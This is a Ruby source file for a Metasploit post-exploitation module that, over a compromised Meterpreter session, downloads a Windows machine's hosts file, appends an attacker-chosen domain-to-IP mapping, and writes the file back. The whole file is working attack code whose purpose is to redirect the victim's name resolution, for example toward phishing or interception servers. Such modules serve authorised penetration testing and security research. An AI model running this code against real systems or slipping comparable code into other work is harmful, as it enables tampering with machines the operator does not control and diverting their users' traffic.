##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Hosts File Injection',
        'Description' => %q{
          This module allows the attacker to insert a new entry into the target
          system's hosts file.
        },
        'License' => BSD_LICENSE,
        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_close
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_tell
              core_channel_write
              stdapi_fs_stat
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
        OptString.new('IP', [ true, 'IP address to point domain name to.' ])
      ]
    )
  end

  def run
    if datastore['IP'].nil? || datastore['DOMAIN'].nil?
      print_error('Please specify both DOMAIN and IP')
      return
    end

    ip = datastore['IP']
    hostname = datastore['DOMAIN']

    # Get a temporary file path
    meterp_temp = Tempfile.new('meterp')
    meterp_temp.binmode
    temp_path = meterp_temp.path

    begin
      # Download the remote file to the temporary file
      client.fs.file.download_file(temp_path, 'C:\\WINDOWS\\System32\\drivers\\etc\\hosts')
    rescue Rex::Post::Meterpreter::RequestError => e
      # If the file doesn't exist, then it's okay.  Otherwise, throw the
      # error.
      if e.result != 2
        raise $ERROR_INFO
      end
    end

    print_status("Inserting hosts file entry pointing #{hostname} to #{ip}..")
    hostsfile = ::File.open(temp_path, 'ab')
    hostsfile.write("\r\n#{ip}\t#{hostname}")
    hostsfile.close

    client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', temp_path)
    print_good('Done!')
  end
end
